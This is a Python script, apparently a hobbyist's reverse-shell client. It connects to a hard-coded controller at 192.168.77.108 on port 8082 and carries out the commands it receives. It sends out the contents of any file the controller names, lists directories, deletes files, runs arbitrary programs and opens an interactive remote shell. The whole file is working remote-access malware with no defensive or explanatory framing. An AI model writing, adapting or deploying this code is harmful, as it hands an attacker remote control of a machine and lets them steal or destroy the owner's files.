import os
import socket
import subprocess

s=socket.socket()
port = 8082

host = "192.168.77.108"

s.connect((host,port))
print("********-----connnected to server--------*******")

while 1:
    command =  s.recv(5000)
    command = command.decode()
    print("command has been received")

#to view the current working direc
    if command == "view":
        cwd = os.getcwd()
        files = str(cwd)
        s.send(files.encode())
        print("command has been sended to server and executerd")
# to view the list directory
    elif command == "ls":
        output = subprocess.run(["ls"],capture_output=True) # output is object not variable  output access the stdout(attibute)
        s.send(output.stdout)
        print("shell info sended")

# to download a file using the python

    elif command == "download_file":
        print("++in")
        path = s.recv(5000)
        print("+++received+++")
        path = path.decode()
        file = open(path, "rb")
        data = file.read()  # call read() method to read file data
        s.send(data)  # send binary data directly
        print("\n\nfile has been sent\n\n")

#change directory
    elif command == "..":
        os.chdir('..')
        data = "path changed"
        s.send(data.encode())

#remove a file
    elif command == "rm":
        print("++++")
        path= s.recv(5000)
        path = path.decode()
        os.remove(path)
        data = "removed"
        s.send(data.encode())

    elif command == "run":
        print("++++")
        arg1= s.recv(5000)
        arg1 = arg1.decode()
        print("got arg1")
        arg2 = s.recv(5000)
        print("got arg2")
        arg2 = arg2.decode()
        output = subprocess.run([arg1, arg2], stdout=subprocess.PIPE)
        print("+++RUNNING++")
        file = output.stdout
        s.send(file)
        print("--snd--")

        # this is to downoad the remote file
    elif command == "shell":
        print("entered into shell")
        while 1:
            cmd = s.recv(5000)
            cmd = cmd.decode()
            cmd=str(cmd)
            print("got the shell comamnde")
            if cmd == "exit":
                file = "going out"
                s.send(file.encode())
                print("--snd--")
                break
            else:
                print(cmd)
                output= subprocess.run([cmd], stdout=subprocess.PIPE)
                file= output.stdout
                s.send(file)
                print("--snd--")




#we need to create a program that upload and it connec